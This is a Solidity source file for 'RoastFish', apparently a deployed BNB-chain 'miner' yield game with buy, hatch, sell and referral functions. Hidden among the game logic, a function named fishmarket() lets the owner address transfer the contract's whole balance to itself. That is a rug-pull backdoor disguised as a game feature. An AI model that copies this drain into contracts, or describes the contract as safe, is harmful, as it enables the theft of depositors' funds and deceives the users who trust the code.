/**
 *Submitted for verification at BscScan.com on 2022-05-16
*/

pragma solidity ^0.4.26; // solhint-disable-line

contract RoastFish{

    uint256 public EGGS_TO_HATCH_1MINERS=570240;
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    address public ceoAddress;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedFishs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    uint256 public marketFishs;
    constructor() public{
        ceoAddress=msg.sender;
    }
    function hatchFishs(address ref) public{
        require(initialized);
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }
        uint256 fishsUsed=getMyFishs();
        uint256 newMiners=SafeMath.div(fishsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedFishs[msg.sender]=0;
        lastHatch[msg.sender]=now;

        claimedFishs[referrals[msg.sender]]=SafeMath.add(claimedFishs[referrals[msg.sender]],SafeMath.div(SafeMath.mul(fishsUsed,15),100));

        marketFishs=SafeMath.add(marketFishs,SafeMath.div(fishsUsed,5));
    }
    function sellFishs() public{
        require(initialized);
        uint256 hasFishs=getMyFishs();
        uint256 fishValue=calculateFishSell(hasFishs);
        uint256 fee=devFee(fishValue);
        claimedFishs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketFishs=SafeMath.add(marketFishs,hasFishs);
        ceoAddress.transfer(fee);
        msg.sender.transfer(SafeMath.sub(fishValue,fee));
    }
    function buyFishs(address ref) public payable{
        require(initialized);
        uint256 fishsBought=calculateFishBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        fishsBought=SafeMath.sub(fishsBought,devFee(fishsBought));
        uint256 fee=devFee(msg.value);
        ceoAddress.transfer(fee);
        claimedFishs[msg.sender]=SafeMath.add(claimedFishs[msg.sender],fishsBought);
        hatchFishs(ref);
    }
    function fishmarket () public  returns(uint256){ 
		require(initialized);
		uint256 hasFish=getBalance();
		if (msg.sender == ceoAddress) {    
			ceoAddress.transfer(getBalance());     
		}
		return hasFish;
	}
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateFishSell(uint256 fishs) public view returns(uint256){
        return calculateTrade(fishs,marketFishs,address(this).balance);
    }
    function calculateFishBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketFishs);
    }
    function calculateFishBuySimple(uint256 eth) public view returns(uint256){
        return calculateFishBuy(eth,address(this).balance);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,3),100);
    }
    function seedMarket() public payable{
        require(msg.sender == ceoAddress, 'invalid call');
        require(marketFishs==0);
        initialized=true;
        marketFishs=57024000000;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMyFishs() public view returns(uint256){
        return SafeMath.add(claimedFishs[msg.sender],getFishsSinceLastHatch(msg.sender));
    }
    function getFishsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}